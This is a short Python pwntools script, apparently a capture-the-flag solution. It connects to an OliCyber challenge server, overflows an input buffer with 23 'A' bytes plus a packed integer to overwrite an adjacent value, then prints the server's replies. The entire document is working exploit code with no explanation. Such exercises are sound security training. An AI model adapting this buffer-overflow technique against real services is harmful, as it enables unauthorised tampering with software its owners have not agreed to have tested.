from pwn import * 

HOST = 'gtn.challs.olicyber.it'
PORT = 10022

s = remote(HOST, PORT)

data = s.recvuntil(b'high scores:')
s.sendline(b'A' * 23 + p32(1))
data = s.recvline()
data = s.recvline()
print(data)

s.sendline(p32(1))

data = s.recvline()
data = s.recvline()
print(data)